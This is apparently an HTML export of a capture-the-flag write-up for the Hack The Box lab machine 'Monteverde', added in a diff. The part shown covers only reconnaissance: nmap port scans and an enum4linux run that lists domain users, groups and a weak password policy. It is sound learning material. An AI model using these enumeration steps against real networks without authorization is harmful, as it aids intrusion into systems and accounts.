@@ -1,0 +1,1489 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Monteverde - 10.10.10.172</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-default_background {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
+.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="148d1b9f-8847-8038-836a-e21ab0fcf9ad" class="page sans"><header><h1 class="page-title">Monteverde - 10.10.10.172</h1><p class="page-description"></p></header><div class="page-body"><h1 id="bae61061-36ab-4987-b4cd-f444445e744d" class="">Information Gathering &amp; Enumeration</h1><h2 id="b420116f-c55a-4202-97fc-b615496abfaf" class="">NMAP</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="822c3a11-0dc6-49e4-adbc-6d4513dec4a0" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ sudo nmap -sS -p- --min-rate=5000 -T5 -n 10.10.10.172
+[sudo] contraseña para drroot: 
+Starting Nmap 7.92 ( https://nmap.org ) at 2024-11-24 18:09 -05
+Nmap scan report for 10.10.10.172
+Host is up (0.099s latency).
+Not shown: 65516 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49667/tcp open  unknown
+49673/tcp open  unknown
+49674/tcp open  unknown
+49676/tcp open  unknown
+49696/tcp open  unknown
+52040/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 39.82 seconds
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f308bb6b-2939-4073-8d51-077f9ee486b6" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ nmap -sVC -T5 10.10.10.172 -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49696,52040 -Pn
+Starting Nmap 7.92 ( https://nmap.org ) at 2024-11-24 18:16 -05
+Nmap scan report for 10.10.10.172
+Host is up (0.100s latency).
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-24 23:16:13Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc         Microsoft Windows RPC
+49676/tcp open  msrpc         Microsoft Windows RPC
+49696/tcp open  msrpc         Microsoft Windows RPC
+52040/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-11-24T23:17:06
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 98.71 seconds
+                              </code></pre><p id="3885923c-4f61-4d3c-8419-6457fb7d3661" class="">
+</p><h2 id="f6fa7634-95d7-47c3-a258-7cc9a4c496d6" class="">AD - SMB enumeration</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fa8cad51-316e-43ea-b94d-e0f441c51541" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ enum4linux -a 10.10.10.172
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Nov 24 18:20:47 2024
+
+ =========================================( Target Information )=========================================
+
+Target ........... 10.10.10.172
+RID Range ........ 500-550,1000-1050
+Username ......... &#x27;&#x27;
+Password ......... &#x27;&#x27;
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ============================( Enumerating Workgroup/Domain on 10.10.10.172 )============================
+
+
+[E] Can&#x27;t find workgroup/domain
+
+
+
+ ================================( Nbtstat Information for 10.10.10.172 )================================
+
+Looking up status of 10.10.10.172
+No reply from 10.10.10.172
+
+ ===================================( Session Check on 10.10.10.172 )===================================
+
+
+[+] Server 10.10.10.172 allows sessions using username &#x27;&#x27;, password &#x27;&#x27;
+
+
+ ================================( Getting domain SID for 10.10.10.172 )================================
+
+Domain Name: MEGABANK
+Domain Sid: S-1-5-21-391775091-850290835-3566037492
+
+[+] Host is part of a domain (not a workgroup)
+
+
+ ===================================( OS information on 10.10.10.172 )===================================
+
+
+[E] Can&#x27;t get OS info with smbclient
+
+
+[+] Got OS info for 10.10.10.172 from srvinfo: 
+do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
+
+
+ =======================================( Users on 10.10.10.172 )=======================================
+
+index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2	Name: AAD_987d7f2f57d2	Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
+index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos	Name: Dimitris Galanos	Desc: (null)
+index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
+index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope	Name: Mike Hope	Desc: (null)
+index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary	Name: Ray O&#x27;Leary	Desc: (null)
+index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs	Name: SABatchJobs	Desc: (null)
+index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan	Name: Sally Morgan	Desc: (null)
+index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata	Name: svc-ata	Desc: (null)
+index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec	Name: svc-bexec	Desc: (null)
+index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp	Name: svc-netapp	Desc: (null)
+
+user:[Guest] rid:[0x1f5]
+user:[AAD_987d7f2f57d2] rid:[0x450]
+user:[mhope] rid:[0x641]
+user:[SABatchJobs] rid:[0xa2a]
+user:[svc-ata] rid:[0xa2b]
+user:[svc-bexec] rid:[0xa2c]
+user:[svc-netapp] rid:[0xa2d]
+user:[dgalanos] rid:[0xa35]
+user:[roleary] rid:[0xa36]
+user:[smorgan] rid:[0xa37]
+
+ =================================( Share Enumeration on 10.10.10.172 )=================================
+
+do_connect: Connection to 10.10.10.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+
+	Sharename       Type      Comment
+	---------       ----      -------
+Reconnecting with SMB1 for workgroup listing.
+Unable to connect with SMB1 -- no workgroup available
+
+[+] Attempting to map shares on 10.10.10.172
+
+
+ ============================( Password Policy Information for 10.10.10.172 )============================
+
+
+
+[+] Attaching to 10.10.10.172 using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+	[!] Protocol failed: Cannot request session (Called Name:10.10.10.172)
+
+[+] Trying protocol 445/SMB...
+
+[+] Found domain(s):
+
+	[+] MEGABANK
+	[+] Builtin
+
+[+] Password Info for Domain: MEGABANK
+
+	[+] Minimum password length: 7
+	[+] Password history length: 24
+	[+] Maximum password age: 41 days 23 hours 53 minutes 
+	[+] Password Complexity Flags: 000000
+
+		[+] Domain Refuse Password Change: 0
+		[+] Domain Password Store Cleartext: 0
+		[+] Domain Password Lockout Admins: 0
+		[+] Domain Password No Clear Change: 0
+		[+] Domain Password No Anon Change: 0
+		[+] Domain Password Complex: 0
+
+	[+] Minimum password age: 1 day 4 minutes 
+	[+] Reset Account Lockout Counter: 30 minutes 
+	[+] Locked Account Duration: 30 minutes 
+	[+] Account Lockout Threshold: None
+	[+] Forced Log off Time: Not Set
+
+
+
+[+] Retieved partial password policy with rpcclient:
+
+
+Password Complexity: Disabled
+Minimum Password Length: 7
+
+
+ =======================================( Groups on 10.10.10.172 )=======================================
+
+
+[+] Getting builtin groups:
+
+group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
+group:[Incoming Forest Trust Builders] rid:[0x22d]
+group:[Windows Authorization Access Group] rid:[0x230]
+group:[Terminal Server License Servers] rid:[0x231]
+group:[Users] rid:[0x221]
+group:[Guests] rid:[0x222]
+group:[Remote Desktop Users] rid:[0x22b]
+group:[Network Configuration Operators] rid:[0x22c]
+group:[Performance Monitor Users] rid:[0x22e]
+group:[Performance Log Users] rid:[0x22f]
+group:[Distributed COM Users] rid:[0x232]
+group:[IIS_IUSRS] rid:[0x238]
+group:[Cryptographic Operators] rid:[0x239]
+group:[Event Log Readers] rid:[0x23d]
+group:[Certificate Service DCOM Access] rid:[0x23e]
+group:[RDS Remote Access Servers] rid:[0x23f]
+group:[RDS Endpoint Servers] rid:[0x240]
+group:[RDS Management Servers] rid:[0x241]
+group:[Hyper-V Administrators] rid:[0x242]
+group:[Access Control Assistance Operators] rid:[0x243]
+group:[Remote Management Users] rid:[0x244]
+group:[Storage Replica Administrators] rid:[0x246]
+
+[+]  Getting builtin group memberships:
+
+Group: Windows Authorization Access Group&#x27; (RID: 560) has member: Couldn&#x27;t lookup SIDs
+Group: Guests&#x27; (RID: 546) has member: Couldn&#x27;t lookup SIDs
+Group: Remote Management Users&#x27; (RID: 580) has member: Couldn&#x27;t lookup SIDs
+Group: IIS_IUSRS&#x27; (RID: 568) has member: Couldn&#x27;t lookup SIDs
